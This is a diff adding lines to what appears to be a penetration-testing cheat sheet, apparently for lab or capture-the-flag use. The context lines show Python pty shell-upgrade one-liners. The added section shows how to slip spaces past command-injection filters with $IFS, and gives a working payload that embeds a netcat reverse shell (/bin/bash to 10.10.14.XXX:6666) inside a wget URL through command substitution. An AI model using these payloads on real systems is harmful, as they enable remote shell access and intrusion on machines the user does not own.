@@ -7,3 +7,8 @@
  
 `python3 -c 'import pty; pty.spawn("/bin/sh")'`
 `python -c 'import pty; pty.spawn("/bin/sh")'`
+
+# Command injetion space
+Use `$IFS`.
+Together with Netcat:
+`wget http://10.10.14.XXX:8000/$(nc.traditional$IFS-e/bin/bash$IFS'10.10.14.XXX'$IFS'6666')`
